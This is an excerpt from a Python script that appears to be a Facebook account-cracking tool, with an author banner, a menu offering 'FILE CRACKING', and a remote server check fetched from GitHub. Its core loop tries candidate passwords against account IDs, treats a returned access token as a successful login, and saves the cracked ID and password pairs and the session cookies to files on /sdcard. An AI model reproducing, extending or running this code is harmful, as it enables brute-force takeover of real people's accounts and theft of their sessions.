...
BC = "\033[1;0m"
loooop = 0
#.  os.system("xdg-https://www.facebook.com/profile.php?id=100072425385396")
os.system('clear')
def __banner___():
...
\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mFB         :  Tajul Islam Rabbi              
\033[1;37m[\033[1;92m<>\033[1;37m] \033[1;92mGITHUB     :  Hacker1414          
...
try:
	os.system('clear')
	serv = requests.get('https://raw.githubusercontent.com/Hacker1414/SERVER/main/MAIN-SERV').text
	if "main" in serv:
		os.system('clear')
		__banner___()
...
def main():
   ...
   ## print(f"\033[1;37m[\033[1;92m1\033[1;37m] \033[1;92mFILE CRACKING ")
    ...
    aysha()
    TAJUL= input('\033[1;37m[\033[1;92m>\033[1;37m] \033[1;92mSELECT : ')
    if TAJUL in ['4','01','A','a']:
        ___mix___()
    elif TAJUL in ['1','02','B','b']:
        ___mix___()
    elif TAJUL in ['2','03','C','c']:
        #  os.system('xdg-open https://www.facebook.com/profile.php?id=100072425385396')
        __ind__()
    elif TAJUL in ['4','04','D','d']:
        __ind__()
    elif TAJUL in ['0','00','E','e']:
        exit()
    else:
        print('\n\033[1;91m[x] Choose valid option ... ');TAJUL()
...
#. os.system("xdg-open https://www.facebook.com/iam.TAJULrashid")
    code = input('\033[1;92m[>] SELECT : ')
  # os.system('xdg-open https://github.com/TAJUL-212')
    print()
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mTAJUL-zip-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m~[TAJUL-zip-OK] '+ids+' ~ '+pas+'\033[1;92m')
                #. print(f"\r\33[1;36mCOOKIES=[🐼]: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/TAJUL-zip-OKS.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/TAJUL-zip-COOKIE','a').write(kuki+'\n')
                break
                                ...
                                if ids in oks:pass
                                        ...
                                        #print('\r\r\033[1;30m [TAJUL-zip-CP] \033[1;30m'+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TAJUL-zip-rnd-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
            else:continue
        loop+=1
